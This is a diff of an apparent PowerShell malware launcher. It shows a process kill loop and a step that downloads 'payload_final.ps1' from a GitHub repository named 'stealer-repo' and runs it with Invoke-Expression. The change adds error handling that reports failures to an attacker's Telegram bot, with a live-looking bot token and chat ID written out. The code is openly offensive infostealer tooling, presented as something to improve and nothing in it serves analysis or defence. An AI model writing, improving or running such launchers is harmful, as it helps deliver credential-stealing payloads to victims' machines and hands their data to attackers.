@@ -23,6 +23,19 @@ foreach ($proc in $killList) {
 
 # Download and execute payload (v2 anti-cache)
 $url = "https://raw.githubusercontent.com/isajarGamer2/stealer-repo/main/payload_final.ps1"
-$payload = Invoke-WebRequest -Uri $url -UseBasicParsing -TimeoutSec 15 -UserAgent "Mozilla/5.0"
-Invoke-Expression $payload.Content
+try {
+    $payload = Invoke-WebRequest -Uri $url -UseBasicParsing -TimeoutSec 15 -UserAgent "Mozilla/5.0" -ErrorAction Stop
+    Invoke-Expression $payload.Content
+} catch {
+    # If payload fails, log error
+    $errMsg = "Launcher FAILED: $($_.Exception.Message)"
+    # Try to send error to Telegram
+    try {
+        Invoke-RestMethod -Uri "https://api.telegram.org/bot8785045003:AAGsICsqOyT3t_luH2Y4WQSJ746dnbZZby4/sendMessage" -Method Post -Body @{
+            chat_id = "8445047233"
+            text = $errMsg
+        } | Out-Null
+    } catch {}
+    exit 1
+}
 exit
